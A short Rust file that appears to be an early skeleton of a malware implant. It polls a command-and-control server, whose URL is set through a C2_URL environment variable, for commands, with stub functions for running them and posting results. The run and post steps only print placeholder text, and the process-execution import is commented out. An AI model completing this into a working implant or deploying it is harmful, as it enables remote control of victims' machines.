use reqwest::Result;
use reqwest::blocking::Client;
//use std::process::Command;
use std::time::Duration;

fn poll_command(client: &Client, url: &str) -> Result<String> {
    // Poll the C2 server to see if we have any waiting commands
    
    let res = client.get(url).send()?.text()?;
    Ok(res)
}

fn run_command(cmd: &str) -> &str {
    println!("Dummy running command: {}", cmd);
    "wibble"
}

fn post_result(res: &str) {
    println!("Dummy post of result: {}", res);
}

fn main() -> Result<()>{

    let url = env!("C2_URL", "Set the C2_URL environment variable with the address of your C2 server");
    let timeout = Duration::new(5,0);
    let client = Client::builder().timeout(timeout).build()?;

    loop {
        // Check for commands
        match poll_command(&client, url) {
            Ok(cmd) => {
                let res = run_command(&cmd);
                post_result(res)
            },
            Err(_) => {
                println!("There has been an error");
                break
            }
        }
    }

    Ok(())
}
